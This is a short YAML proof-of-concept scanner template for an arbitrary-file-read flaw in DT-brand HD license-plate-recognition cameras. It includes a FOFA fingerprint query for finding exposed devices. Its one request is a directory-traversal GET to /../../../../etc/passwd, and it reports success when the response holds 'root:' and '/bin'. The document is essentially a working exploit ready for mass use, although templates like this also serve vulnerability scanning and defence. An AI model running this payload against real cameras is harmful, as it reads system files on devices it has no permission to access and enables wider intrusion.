id: poc-yaml-dt-hd-license-plate-recognition-camera-anyfile-read
info:
  name: DT高清车牌识别摄像机 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 高清车牌识别摄像机
  fofa: app="DT-高清车牌识别摄像机"
requests:
- method: GET
  path: /../../../../etc/passwd
  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
    /bin\") &&\n!contains(body,\"<\")\n"
variables: {}
transport: http
